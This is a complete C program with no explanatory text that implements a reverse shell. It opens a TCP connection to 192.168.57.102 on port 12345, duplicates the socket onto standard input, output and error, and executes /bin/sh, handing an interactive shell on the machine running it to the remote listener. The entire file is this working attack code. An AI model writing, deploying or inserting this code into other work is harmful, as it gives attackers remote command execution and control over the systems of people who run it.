#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void) {
    int sockfd;
    int lportno = 12345;
    struct sockaddr_in serv_addr;
    char *const params[] = {"/bin/sh", NULL};
    char *const environ[] = {NULL};

    sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = inet_addr("192.168.57.102");
    serv_addr.sin_port = htons(lportno);
    connect(sockfd, (struct sockaddr *) &serv_addr, 16);

    dup2(sockfd, 0);
    dup2(0, 1);
    dup2(0, 2);
    execve("/bin/sh", params, environ);
}